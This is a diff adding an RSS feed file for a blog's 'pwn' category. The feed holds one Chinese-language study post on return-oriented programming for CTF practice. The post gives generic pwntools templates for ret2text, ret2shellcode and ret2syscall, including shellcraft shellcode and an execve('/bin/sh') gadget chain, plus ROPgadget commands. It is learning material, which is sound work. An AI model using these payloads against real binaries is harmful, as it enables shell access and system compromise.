@@ -1,0 +1,108 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>pwn on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/pwn/</link><description>Recent content in pwn on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 18 Jan 2022 00:00:14 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/pwn/index.xml" rel="self" type="application/rss+xml"/><item><title>pwn rop入门-学习笔记</title><link>https://amiaaaz.github.io/2022/01/18/pwn-rop-study-notes/</link><pubDate>Tue, 18 Jan 2022 00:00:14 +0800</pubDate><guid>https://amiaaaz.github.io/2022/01/18/pwn-rop-study-notes/</guid><description>&lt;h1 id="rop">ROP&lt;/h1>
+&lt;p>return oriented programming&lt;/p>
+&lt;h2 id="简单的汇编指令">简单的汇编指令&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>ret -&amp;gt; pop EIP (ESP增大)&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>leave -&amp;gt; move ESP, EBP; pop EBP&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>intel&lt;/th>
+&lt;th>AT&amp;amp;T&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>mov eax, 8&lt;/td>
+&lt;td>movl $8, %eax&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>mov ebx, 0ffffh&lt;/td>
+&lt;td>movl $0xffff, %ebx&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>int 80h&lt;/td>
+&lt;td>int $80&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>mov eax, [ecx]&lt;/td>
+&lt;td>movl (%ecx), %eax&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="几种防护措施">几种防护措施&lt;/h2>
+&lt;ul>
+&lt;li>canary: 随机值防止栈溢出 (cookie)&lt;/li>
+&lt;li>ASLR: 全局系统变量&lt;code>/proc/sys/kernel/randomize_va_space&lt;/code>，内存地址随机化，而gdb调试中为关闭状态&lt;/li>
+&lt;li>PIE: 内存地址随机化&lt;/li>
+&lt;li>NX: 数据不可执行&lt;/li>
+&lt;/ul>
+&lt;h2 id="ret2text">ret2text&lt;/h2>
+&lt;p>在代码段.text存在后门函数，将ret address修改为后门函数的地址控制函数的执行&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cyclic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">p32&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#75715e"># n: ebp-eax+4(or 8), p32 or p64&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ret2shellcode">ret2shellcode&lt;/h2>
+&lt;p>存在rwx代码片段，传入shellcode并修改ret address为shellcode所在的缓冲区地址&lt;/p>
+&lt;p>NX不开启时直接写入栈缓冲区，开启时向bss缓冲区或堆缓冲区写入shellcode并使用mprotect赋予可执行权限&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;a href="http://shell-storm.org/shellcode/">shellcode&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">pwn&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
+&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">amd64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e"># before: context.arch = &amp;#39;amd64&amp;#39;!&lt;/span>
+&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">asm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">())&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
+&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ljust&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">p32&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sh_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ret2syscall">ret2syscall&lt;/h2>
+&lt;p>存在&lt;code>/bin/sh&lt;/code>或&lt;code>sh&lt;/code>字符串，构造gadgets多次跳转ret addr来执行&lt;code>execve&lt;/code>系统调用；gadgets通过&lt;code>ROPgadget&lt;/code>寻找&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">ROPgadget --binary filename_here --only &lt;span style="color:#d88200">&amp;#39;pop|ret&amp;#39;&lt;/span> &lt;span style="color:#111">|&lt;/span> grep &lt;span style="color:#d88200">&amp;#39;ebx&amp;#39;&lt;/span>
+ROPgadget --binary filename_here --string &lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
+ROPgadget --binary rop --only &lt;span style="color:#d88200">&amp;#39;int&amp;#39;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>整体的payload构造与函数调用栈的工作原理和系统调用的实现有关，x86下通过&lt;code>int 0x80&lt;/code>执行，amd64下为&lt;code>syscall&lt;/code>；注意参数传入的顺序 (1-&amp;gt;N) 与栈中存放的顺序 (N-&amp;gt;1)的区别&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cyclic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">pop_eax_ret&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0xb&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pop_edx_ecx_ebx_ret&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">bin_sh_addr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">int80_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#75715e"># 0xb: execve的系统调用号 11, execve(&amp;#34;/bin/sh&amp;#34;, NULL, NULL)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>_Refer: &lt;a href="https://en.wikipedia.org/wiki/System_call">System call&lt;/a>&lt;/p>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
+&lt;/h4>
+&lt;/summary>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;a href="https://www.bilibili.com/video/BV1854y1y7Ro">XMCVE 2020 CTF Pwn入门课程&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">ctfwiki - Stack Overflow&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="https://www.yuque.com/hxfqg9/bin/zzg02e">蒸米ROP&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="https://github.com/Vancir/365-days-get-xuanwulab-job/blob/master/weeks/week1.md">365-days-get-xuanwulab-job/weeks/week1.md&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="http://www.cnblogs.com/clover-toeic/p/3755401.html">C 语言函数调用栈 (一)&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="http://www.cnblogs.com/clover-toeic/p/3756668.html">C 语言函数调用栈 (二)&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="https://www.cnblogs.com/clover-toeic/p/3757091.html">C 语言函数调用栈 (二)&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="https://en.wikipedia.org/wiki/System_call">System call&lt;/a>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/details></description></item></channel></rss>
